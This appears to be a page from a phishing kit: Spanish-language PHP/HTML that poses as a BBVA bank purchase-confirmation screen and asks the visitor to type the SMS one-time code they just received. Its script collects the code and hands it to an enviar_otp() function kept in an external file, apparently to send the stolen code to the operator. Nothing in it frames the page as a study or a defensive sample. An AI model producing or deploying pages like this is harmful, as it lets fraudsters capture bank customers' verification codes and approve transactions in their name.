<?php 




?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="/css/davi.css">


    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		
</head>
<body>
    <div class="details" >
        <img src="/img/bbva.webp" alt="" width="130px">
        <hr>

        <h3 style="color:black;">Vamos a validar tu compra</h3>
        <a style="color:black;">Ingresa el código SMS que te acabamos de enviar y dale "Confirmar".</a><br><p></p>
    
        
        <center><a style="">Código de verificación</a><br>
        <input type="tel" name="cDinamica" id="txtOTP" style="" required minlength="6"><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center><br><br>
    <center><a><b>REENVIAR CÓDIGO</b></a></center><br>
    <a><b>Ayuda</b></a>
    </div>


</body>


<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</html>